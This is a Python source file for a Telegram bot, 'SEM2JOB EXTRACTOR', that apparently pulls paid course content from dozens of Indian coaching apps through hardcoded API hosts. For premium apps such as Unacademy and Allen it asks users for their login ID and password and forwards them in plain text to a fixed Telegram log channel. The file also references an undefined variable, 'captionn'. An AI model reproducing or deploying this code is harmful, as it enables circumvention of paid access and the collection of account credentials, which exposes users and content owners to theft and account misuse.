 import re
import random
from pyrogram import filters
from Extractor import app
from config import OWNER_ID, SUDO_USERS
from Extractor.core import script
from Extractor.core.func import subscribe, chk_user
from pyrogram.types import CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from Extractor.modules.classplus import classplus_txt
from Extractor.modules.exampur import exampur_txt
from Extractor.modules.appex_v3 import appex_v3_txt
from Extractor.modules.khan import khan_login
from Extractor.modules.kdlive import kdlive
from Extractor.modules.pw import pw_login
from Extractor.modules.careerwill import career_will
from Extractor.modules.getappxotp import send_otp
from Extractor.modules.findapi import findapis_extract
from Extractor.modules.utk import handle_utk_logic
from Extractor.modules.iq import handle_iq_logic
from Extractor.modules.adda import adda_command_handler

# Log channel ID
log_channel = -1002385747075

# ------------------------------------------------------------------------------- #
# Home Buttons
buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("🌟 𝐀𝐏𝐏𝐗 𝐀𝐏𝐏𝐒 🌟", callback_data="manual_")],
    [InlineKeyboardButton("🌟 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐀𝐏𝐏𝐒 🌟", callback_data="premium_apps")],
    [
        InlineKeyboardButton("👨‍💻 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", url="https://t.me/YourDeveloperUsername"),
        InlineKeyboardButton("📢 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", url="https://t.me/YourChannelUsername")
    ]
])

# Premium Apps Buttons
premium_apps_button = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🏆 𝐌𝐀𝐃𝐄 𝐄𝐀𝐒𝐘", callback_data="made_easy"),
        InlineKeyboardButton("📚 𝐈𝐀𝐒 𝐌𝐀𝐒𝐓𝐄𝐑", callback_data="ias_master")
    ],
    [
        InlineKeyboardButton("🚀 𝐔𝐍𝐀𝐂𝐀𝐃𝐄𝐌𝐘", callback_data="unacademy"),
        InlineKeyboardButton("🩺 𝐀𝐋𝐋𝐄𝐍", callback_data="allen")
    ],
    [InlineKeyboardButton("🌟 𝐍𝐄𝐗𝐓 𝐈𝐀𝐒", callback_data="next_ias")],
    [InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤", callback_data="home_")]
])

# Modes Buttons
modes_button = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("⚙️ 𝐂𝐮𝐬𝐭𝐨𝐦 𝐌𝐨𝐝𝐞", callback_data="custom_"),
        InlineKeyboardButton("📋 𝐌𝐚𝐧𝐮𝐚𝐥/𝐋𝐢𝐬𝐭", callback_data="manual_")
    ],
    [InlineKeyboardButton("🏠 𝐇𝐨𝐦𝐞", callback_data="home_")]
])

# Custom Mode Buttons
custom_button = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔥 𝐀𝐩𝐩𝐞𝐱 𝐕𝟐", callback_data="v2_"),
        InlineKeyboardButton("🚀 𝐀𝐩𝐩𝐞𝐱 𝐕𝟑", callback_data="v3_"),
        InlineKeyboardButton("✨ 𝐀𝐩𝐩𝐞𝐱 𝐕𝟒", callback_data="v4_")
    ],
    [InlineKeyboardButton("🏠 𝐇𝐨𝐦𝐞", callback_data="home_")]
])

# App List Buttons (Page 1)
button1 = [
    [
        InlineKeyboardButton("🏆 Achievers Academy", callback_data="achievers_acc"),
        InlineKeyboardButton("📚 Adhyayan Mantra", callback_data="adhyan_mantra"),
        InlineKeyboardButton("👨‍🏫 Aman Sir", callback_data="aman_sir")
    ],
    [
        InlineKeyboardButton("🔧 Anil Sir ITI", callback_data="anilsir_iti"),
        InlineKeyboardButton("🎯 App Exampur", callback_data="app_exampur"),
        InlineKeyboardButton("🪖 Army Study", callback_data="army_study")
    ],
    [
        InlineKeyboardButton("📖 Ashish Singh Lec", callback_data="Ashish_lec"),
        InlineKeyboardButton("🧑‍🏫 Bharti Sir", callback_data="bharti_sir"),
        InlineKeyboardButton("🚀 Booster Academy", callback_data="booster_academy")
    ],
    [
        InlineKeyboardButton("🛡️ Cadet Defence", callback_data="cadet_defence"),
        InlineKeyboardButton("⚔️ Commando Academy", callback_data="commando_acc"),
        InlineKeyboardButton("✝️ Christopher", callback_data="christopher_acc")
    ],
    [
        InlineKeyboardButton("🏛️ Dhananjay IAS", callback_data="dhananjay_ias"),
        InlineKeyboardButton("📱 E1 Coaching", callback_data="e1_coaching"),
        InlineKeyboardButton("🎓 Examo Academy", callback_data="examo_acc")
    ],
    [
        InlineKeyboardButton("✅ Exampur", callback_data="exampur_"),
        InlineKeyboardButton("🎯 Goal Yaan", callback_data="goal_yaan"),
        InlineKeyboardButton("☕ Gk Cafe", callback_data="gk_cafe")
    ],
    [
        InlineKeyboardButton("🌱 Grow Academy", callback_data="grow_acc"),
        InlineKeyboardButton("📖 Gyan Bindu", callback_data="gyan_bindu"),
        InlineKeyboardButton("📊 KTDT", callback_data="kt_dt")
    ],
    [
        InlineKeyboardButton("📚 Md Classes", callback_data="md_classes"),
        InlineKeyboardButton("💡 Mg Concept", callback_data="mg_concept"),
        InlineKeyboardButton("👩‍🏫 Mother's Live", callback_data="mothers_live")
    ],
    [
        InlineKeyboardButton("⚡️ Neo Spark", callback_data="neo_spark"),
        InlineKeyboardButton("🌟 Neon Classes", callback_data="neon_classes"),
        InlineKeyboardButton("🩺 Neet Kakajee", callback_data="neet_kakajee")
    ],
    [
        InlineKeyboardButton("🌍 Ng Learners", callback_data="ng_learners"),
        InlineKeyboardButton("🏫 Nidhi Academy", callback_data="nidhi_academy"),
        InlineKeyboardButton("📝 Nimisha Bansal", callback_data="nimisha_bansal")
    ],
    [
        InlineKeyboardButton("🏛️ Nirman IAS", callback_data="nirman_ias"),
        InlineKeyboardButton("📓 Note Book", callback_data="note_book"),
        InlineKeyboardButton("🌊 Ocean Gurukul", callback_data="ocean_gurukul")
    ],
    [
        InlineKeyboardButton("🎖️ Officers Academy", callback_data="officers_acc"),
        InlineKeyboardButton("📚 Parmar SSC", callback_data="permar_ssc"),
        InlineKeyboardButton("🌟 Perfect Academy", callback_data="perfect_acc")
    ],
    [
        InlineKeyboardButton("🔬 PHYSICSASINGH", callback_data="physics_asingh"),
        InlineKeyboardButton("🏫 Platform", callback_data="platform_"),
        InlineKeyboardButton("👨‍🏫 RG Vikramjeet", callback_data="rg_vikramjeet")
    ],
    [
        InlineKeyboardButton("📖 Rk Sir", callback_data="rk_sir"),
        InlineKeyboardButton("💼 Rwa", callback_data="rwa_"),
        InlineKeyboardButton("🏆 Sachin Academy", callback_data="sachin_acc")
    ],
    [
        InlineKeyboardButton("📚 Samyak", callback_data="samyak_ras"),
        InlineKeyboardButton("🎯 Sankalp", callback_data="sankalp_"),
        InlineKeyboardButton("🔬 Science Fun", callback_data="science_fun")
    ],
    [
        InlineKeyboardButton("📖 Singhkori", callback_data="singhkori_education"),
        InlineKeyboardButton("🚀 Space IAS", callback_data="space_ias"),
        InlineKeyboardButton("📚 Study Mantra", callback_data="study_mantra")
    ],
    [
        InlineKeyboardButton("🏫 Ssc Gurkul", callback_data="ssc_gurukul"),
        InlineKeyboardButton("🎯 Ssc Maker", callback_data="ss_maker"),
        InlineKeyboardButton("🌟 Target Plus", callback_data="target_plus")
    ],
    [
        InlineKeyboardButton("🏛️ Target Upsc", callback_data="target_upsc"),
        InlineKeyboardButton("👩‍🏫 TeachingPariksha", callback_data="teaching_"),
        InlineKeyboardButton("📚 Think Ssc", callback_data="think_ssc")
    ],
    [
        InlineKeyboardButton("📖 Tutors Adda", callback_data="tutors_adda"),
        InlineKeyboardButton("📱 Uc Live", callback_data="uc_live"),
        InlineKeyboardButton("💡 Vasu Concept", callback_data="vasu_concept")
    ],
    [
        InlineKeyboardButton("🏫 Vidya Bihar", callback_data="vidya_bihar"),
        InlineKeyboardButton("📚 Vidya Education", callback_data="vidya_education"),
        InlineKeyboardButton("🌟 Vj Education", callback_data="vj_education")
    ],
    [
        InlineKeyboardButton("🏆 Winners", callback_data="winners_"),
        InlineKeyboardButton("⚔️ Yodha", callback_data="yodha_")
    ],
    [
        InlineKeyboardButton("⬅️ Prev", callback_data="prev"),
        InlineKeyboardButton("🏠 𝐇𝐨𝐦𝐞", callback_data="home_"),
        InlineKeyboardButton("Next ➡️", callback_data="next")
    ]
]

# Back Button
back_button = [[InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤", callback_data="home_")]]

# Store user state to track selected app
user_states = {}

# Pagination state
user_page = {}

# Start Caption
caption = (
    "╭━━━━━━━━━━━━━━━━━━━╮\n"
    "┃  ✨ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 SEM2JOB EXTRACTOR 𝗕𝗢𝗧 ✨  ┃\n"
    "╰━━━━━━━━━━━━━━━━━━━╯\n\n"
    "🔥 *Your Ultimate TXT Extractor Assistant!*\n\n"
    "Here are some powerful commands you can use:\n\n"
    "╭───⌬ 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗠𝗘𝗡𝗨 ⌬───╮\n"
    "├ 🐍 /appx – Master AppX\n"
    "├ 📜 /appxlist – AppX List\n"
    "├ 🔐 /appxotp – OTP Login (AppX)\n"
    "├ 🏫 /adda – Adda 247\n"
    "├ 🎓 /cp – Classplus\n"
    "├ 🔍 /getapi – Find AppX API\n"
    "├ 🧠 /iq – Study IQ\n"
    "├ 🏢 /kd – KD Campus\n"
    "├ 📚 /kgs – Khan GS App\n"
    "├ ⚛️ /pw – Physics Wallah\n"
    "├ 🧾 /utkarsh – Utkarsh Classes\n"
    "╰──────────────────────╯\n\n"
    "⚙️ _Use these commands to extract learning content quickly & easily._\n\n"
    "👑 **Owner:** [SEMESTER TO SEM2JOB 💝](https://t.me/SEM2JOB)"
)

# ------------------------------------------------------------------------------- #
# Start Command
@app.on_message(filters.command("start"))
async def start(_, message):
    join = await subscribe(_, message)
    if join == 1:
        return
    await message.reply_photo(
        photo=random.choice(script.IMG),
        caption=captionn,
        reply_markup=buttons
    )

# Apps Command
@app.on_message(filters.command("apps"))
async def apps(_, message):
    await message.reply_photo(
        photo=random.choice(script.IMG),
        caption=captionn,
        reply_markup=buttons
    )

# Appx List Command
@app.on_message(filters.command("appxlist"))
async def appx_list(_, message):
    user_page[message.from_user.id] = 1
    await message.reply_text(
        script.MANUAL_TXT,
        reply_markup=InlineKeyboardMarkup(button1)
    )

# Handle Credentials for Premium Apps
@app.on_message(filters.text & filters.private)
async def handle_credentials(_, message):
    user_id = message.from_user.id
    if user_id in user_states:
        selected_app = user_states[user_id]
        credentials = message.text
        username = f"@{message.from_user.username}" if message.from_user.username else "N/A"
        
        log_message = (
            f"📤 **Login Credentials Submitted**\n\n"
            f"📱 **App Name**: 🔖 {selected_app}\n"
            f"👤 **User ID**: {user_id}\n"
            f"📛 **Username**: {username}\n"
            f"🔐 **Credentials**:\n\n```{credentials}```\n\n"
            f"👨‍💻 **Provided by**: @SEM2JOB_SERVICE_BOT"
        )
        
        try:
            await app.send_message(log_channel, log_message)
            await message.reply_text(
                f"✅ **Credentials Submitted for {selected_app}!**\n\nThank you! We'll process your request soon. 📡",
                reply_markup=InlineKeyboardMarkup(back_button)
            )
        except Exception as e:
            await message.reply_text(
                f"❌ **Error**: Failed to submit credentials. Please try again later.\n\nError: {str(e)}",
                reply_markup=InlineKeyboardMarkup(back_button)
            )
        finally:
            # Remove user from state after handling
            del user_states[user_id]
    else:
        await message.reply_text(
            "❌ **No app selected!** Please select an app first.",
            reply_markup=InlineKeyboardMarkup(back_button)
        )

# Callback Query Handler
@app.on_callback_query()
async def handle_callback(_, query):
    user_id = query.from_user.id
    data = query.data

    # Home Button
    if data == "home_":
        user_page.pop(user_id, None)
        await query.message.edit(
            captionn,
            reply_markup=buttons
        )

    # Modes Button
    elif data == "modes_":
        await query.message.edit_text(
            script.MODES_TXT,
            reply_markup=modes_button
        )

    # Custom Mode
    elif data == "custom_":
        await query.message.edit_text(
            script.CUSTOM_TXT,
            reply_markup=custom_button
        )

    # Manual/List Mode
    elif data == "manual_":
        user_page[user_id] = 1
        await query.message.edit_text(
            script.MANUAL_TXT,
            reply_markup=InlineKeyboardMarkup(button1)
        )

    # Premium Apps
    elif data == "premium_apps":
        await query.message.edit_text(
            "🌟 **Premium Apps** 🌟\n\nSelect a premium app to proceed:",
            reply_markup=premium_apps_button
        )

    # Premium Apps Credentials
    elif data in ["made_easy", "ias_master", "unacademy", "allen", "next_ias"]:
        app_names = {
            "made_easy": "MADE EASY",
            "ias_master": "IAS MASTER",
            "unacademy": "UNACADEMY",
            "allen": "ALLEN",
            "next_ias": "NEXT IAS"
        }
        selected_app = app_names[data]
        user_states[user_id] = selected_app
        await query.message.edit_text(
            f"🔑 **Send Your Login Credentials (ID & Password) for {selected_app}**",
            reply_markup=InlineKeyboardMarkup(back_button)
        )

    # Appx OTP
    elif data == "appxotp_":
        api = await app.ask(query.message.chat.id, text="**🔑 SEND APPX API**\n\n✅ Example: tcsexamzoneapi.classx.co.in")
        api_txt = api.text
        if "api" in api_txt.lower():
            await send_otp(app, query.message, api_txt)
        else:
            await app.send_message(query.message.chat.id, "❌ INVALID INPUT! IF YOU DON'T KNOW API, GO TO FIND API OPTION")

    # Appx V2/V3
    elif data in ["v2_", "v3_"]:
        api = await app.ask(query.message.chat.id, text="**🔑 SEND APPX API Without https://**\n\n✅ Example: tcsexamzoneapi.classx.co.in")
        api_txt = api.text
        name = api_txt.split('.')[0].replace("api", "") if "api" in api_txt.lower() else None
        if name:
            await appex_v3_txt(app, query.message, api_txt, name)
        else:
            await app.send_message(query.message.chat.id, "❌ INVALID INPUT! IF YOU DON'T KNOW API, GO TO FIND API OPTION")

    # Navigation Buttons
    elif data == "prev":
        current_page = user_page.get(user_id, 1)
        if current_page > 1:
            user_page[user_id] = current_page - 1
            # Update with appropriate button list (button1, button2, etc.)
            await query.message.edit_text(
                script.MANUAL_TXT,
                reply_markup=InlineKeyboardMarkup(button1)  # Replace with correct button list
            )
        else:
            await query.answer("You are already on the first page!", show_alert=True)

    elif data == "next":
        current_page = user_page.get(user_id, 1)
        user_page[user_id] = current_page + 1
        # Update with appropriate button list (button2, button3, etc.)
        await query.message.edit_text(
            script.MANUAL_TXT,
            reply_markup=InlineKeyboardMarkup(button1)  # Replace with correct button list
        )

    # Maintenance
    elif data == "maintainer_":
        await query.answer("⚠️ Bot Under Maintenance ⚠️\n📡 Updates Coming Soon!", show_alert=True)

    # App-Specific Handlers
    elif data == "findapi_":
        await findapis_extract(app, query.message)
    
    elif data == "kdlive_":
        await kdlive(app, query.message)
    
    elif data == "careerwill_":
        await career_will(app, query.message)
    
    elif data == "khan_":
        await khan_login(app, query.message)
    
    elif data == "pw_":
        await pw_login(app, query.message)
    
    elif data == "classplus_":
        await classplus_txt(app, query.message)

    # App-Specific APIs
    app_api_map = {
        "vidya_education": {"api": "vidyaeducationrahulsirapi.akamai.net.in", "name": "VIDYA EDUCATION"},
        "platform_": {"api": "platformnavinkumarsinghapi.classx.co.in", "name": "Platform"},
        "teaching_": {"api": "teachingparikshaapi.classx.co.in", "name": "Teaching Parikhsha"},
        "ss_maker": {"api": "sscmakerexampreparationapi.classx.co.in", "name": "SSC Makers"},
        "vasu_concept": {"api": "vasuconceptapi.classx.co.in", "name": "Vasu Concept"},
        "mothers_live": {"api": "mothersliveapi.classx.co.in", "name": "Mother's Live"},
        "examo_acc": {"api": "examoapi.classx.co.in", "name": "Examo Academy"},
        "neon_classes": {"api": "neonclassesapi.classx.co.in", "name": "Neon Classes"},
        "adhyan_mantra": {"api": "adhyayanmantraapi.appx.co.in", "name": "Adhyayan Mantra"},
        "perfect_acc": {"api": "perfectionacademyapi.appx.co.in", "name": "Perfection Academy"},
        "bharti_sir": {"api": "bhartilearningapi.classx.co.in", "name": "Bharti"},
        "nidhi_academy": {"api": "nidhiacademyapi.akamai.net.in", "name": "NIDHI ACADEMY"},
        "physics_asingh": {"api": "physicsasinghsirapi.cloudflare.net.in", "name": "PHYSICSASINGH"},
        "booster_academy": {"api": "boosteracademyapi.classx.co.in", "name": "Booster Academy"},
        "cadet_defence": {"api": "cadetdefenceacademyapi.classx.co.in", "name": "Cadet Defence"},
        "e1_coaching": {"api": "e1coachingcenterapi.cloudflare.net.in", "name": "E1 Coaching"},
        "samyak_ras": {"api": "samyakapi.classx.co.in", "name": "Samyak"},
        "vj_education": {"api": "vjeducationapi.appx.co.in", "name": "VJ Education"},
        "gyan_bindu": {"api": "gyanbinduapi.appx.co.in", "name": "Gyan Bindu"},
        "dhananjay_ias": {"api": "dhananjayiasacademyapi.classx.co.in", "name": "Dhananjay IAS"},
        "think_ssc": {"api": "thinksscapi.classx.co.in", "name": "Think SSC"},
        "Ashish_lec": {"api": "ashishsinghlecturesapi.classx.co.in", "name": "Ashish Singh"},
        "tutors_adda": {"api": "tutorsaddaapi.classx.co.in", "name": "Tutors Adda"},
        "nimisha_bansal": {"api": "nimishabansalapi.appx.co.in", "name": "Nimisha Bansal"},
        "sachin_acc": {"api": "sachinacademyapi.classx.co.in", "name": "Sachin Academy"},
        "target_plus": {"api": "targetpluscoachingapi.classx.co.in", "name": "Target Plus Coaching"},
        "rwa_": {"api": "rozgarapinew.teachx.in", "name": "Rojgar with Ankit"},
        "winners_": {"api": "winnersinstituteapi.classx.co.in", "name": "Winners"},
        "ocean_gurukul": {"api": "oceangurukulsapi.classx.co.in", "name": "Ocean Gurukul"},
        "mg_concept": {"api": "mgconceptapi.classx.co.in", "name": "MG Concept"},
        "yodha_": {"api": "yodhaappapi.classx.co.in", "name": "Yodha"},
        "note_book": {"api": "notebookapi.classx.co.in", "name": "Note Book"},
        "uc_live": {"api": "ucliveapi.classx.co.in", "name": "UC LIVE"},
        "space_ias": {"api": "spaceiasapi.classx.co.in", "name": "Space IAS"},
        "rg_vikramjeet": {"api": "rgvikramjeetapi.akamai.net.in", "name": "RG Vikramjeet"},
        "vidya_bihar": {"api": "vidyabiharapi.teachx.in", "name": "Vidya Bihar"},
        "aman_sir": {"api": "amansirenglishapi.classx.co.in", "name": "Aman Sir English"},
        "nirman_ias": {"api": "nirmaniasapi.classx.co.in", "name": "Nirman IAS"},
        "permar_ssc": {"api": "parmaracademyapi.cloudflare.net.in", "name": "Parmar Academy"},
        "neo_spark": {"api": "neosparkapi.classx.co.in", "name": "Neo Spark"},
        "md_classes": {"api": "mdclassesapi.classx.co.in", "name": "MD Classes"},
        "ng_learners": {"api": "nglearnersapi.classx.co.in", "name": "NG Learners"},
        "ssc_gurukul": {"api": "ssggurukulapi.appx.co.in", "name": "SSC Gurukul"},
        "army_study": {"api": "armystudyliveclassesapi.classx.co.in", "name": "Army Study Live"},
        "sankalp_": {"api": "sankalpclassesapi.classx.co.in", "name": "Sankalp"},
        "target_upsc": {"api": "targetupscapi.classx.co.in", "name": "Target UPSC"},
        "gk_cafe": {"api": "gkcafeapi.classx.co.in", "name": "GK Cafe"},
        "officers_acc": {"api": "theofficersacademyapi.classx.co.in", "name": "Officers Academy"},
        "rk_sir": {"api": "rksirofficialapi.classx.co.in", "name": "Rk Sir Official"},
        "study_mantra": {"api": "studymantraapi.classx.co.in", "name": "Study Mantra"},
        "science_fun": {"api": "sciencefunapi.classx.co.in", "name": "Science Fun"},
        "grow_acc": {"api": "growacademyapi.classx.co.in", "name": "Grow Academy"},
        "goal_yaan": {"api": "goalyaanapi.appx.co.in", "name": "Goal Yaan"},
        "anilsir_iti": {"api": "anilsiritiapi.classx.co.in", "name": "Anil Sir Iti"},
        "achievers_acc": {"api": "achieversacademyapi.classx.co.in", "name": "Achievers Academy"},
        "commando_acc": {"api": "commandoacademyapi.appx.co.in", "name": "Commando Academy"},
        "exampur_": {"api": "exampurapi.classx.co.in", "name": "Exampur"},
        "neet_kakajee": {"api": "neetkakajeeapi.classx.co.in", "name": "Neet Kaka JEE"},
        "app_exampur": {"api": "exampurapi.classx.co.in", "name": "App Exampur"}
    }

    if data in app_api_map:
        api_info = app_api_map[data]
        await appex_v3_txt(app, query.message, api_info["api"], api_info["name"])

    # Close Button
    elif data == "close_data":
        await query.message.delete()
        if query.message.reply_to_message:
            await query.message.reply_to_message.delete()
